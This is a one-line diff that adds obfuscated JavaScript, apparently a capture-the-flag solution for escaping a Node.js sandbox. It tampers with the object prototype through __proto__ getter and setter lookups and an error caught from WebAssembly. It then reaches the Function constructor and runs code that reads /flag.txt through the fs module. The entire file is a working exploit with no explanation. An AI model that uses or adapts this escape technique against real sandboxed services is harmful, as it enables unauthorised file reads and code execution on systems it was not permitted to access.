@@ -1,0 +1,1 @@
+c=Buffer.call;C=c.bind(c);p="__proto__";(async()=>{for(i of[,1])try{await WebAssembly.compileStreaming()}catch(e){i?e.constructor.constructor("console.log(process.mainModule.require(`fs`).readFileSync(`/flag.txt`)+``)")():C(C(c.__lookupSetter__,c,p),C(C(c.__lookupGetter__,c,p),e),null)}})()
